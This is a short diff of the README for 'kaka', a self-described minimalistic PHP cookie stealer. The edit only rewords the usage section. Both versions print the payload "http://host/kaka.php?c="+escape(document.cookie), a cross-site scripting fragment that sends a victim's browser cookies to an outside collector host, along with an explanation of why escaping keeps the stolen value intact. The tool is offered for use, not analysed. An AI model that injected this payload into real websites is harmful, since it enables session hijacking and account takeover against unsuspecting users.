@@ -2,10 +2,10 @@ kaka
 ----
 Kaka is cookie in swedish. A minimalistic cookie stealer written in PHP.
 
-usage
+Usage
 -----
-"http://host/kaka.php?c="+escape(document.cookie)
-	The escape function is to prevent ampersand (&) from splitting into multiple GET variables.
+"http://host/kaka.php?c="+escape(document.cookie)  
+	The escape function is used to prevent ampersand characters (&) from splitting the request into multiple GET variables.
 
 Public domain
 -------------
